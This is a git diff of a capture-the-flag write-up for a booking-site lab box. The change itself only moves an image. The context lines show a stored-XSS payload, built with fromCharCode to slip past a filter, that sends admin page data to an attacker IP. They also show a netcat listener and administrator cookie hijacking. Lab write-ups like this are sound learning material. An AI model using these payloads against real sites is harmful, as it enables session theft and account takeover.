@@ -105,8 +105,6 @@ Log in with this user. It seems to be a booking website.
 
 Click any booking and see the booking details. It consists of two tabs, including View and Notes. In Notes, one word is interesting: "All notes must be approved by an administrator - this process can take up to 1 minute." An administrator is always attractive to hackers. It seems that the note will be approved by the administrator. So it's possible to steal the session cookie of the administrator if there is an XSS vulnerability in the note edit form. I think it's the hardest part of this box. It's not easy to find the appropriate pass way. There is a way to utilize `fromCharCode` and other skills to pass the XSS filter. The following javascript code is utilized to generate the payload:
 
-![admin](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)
-
 ```javascript
 var url = 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65';
 var str = `$.ajax({method:'GET',url:'${url}',success:function(data){$.post('http://10.10.16.65',data)}})`;
@@ -124,9 +122,9 @@ console.log(payload);
 
 Set kali to listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali. 
 
-
-
 The cookie of the administrator is obtained which is HTML encoded. Decode it with a burp. And change the cookie in the storage of firefox. Refresh the web page. Now you can hijack the administrator session cookie. Access to `http://10.10.10.25:8000/admin`. There seems nothing special except two buttons, including Booking and Notes. 
+
+![admin](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)
 
 ![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)
 
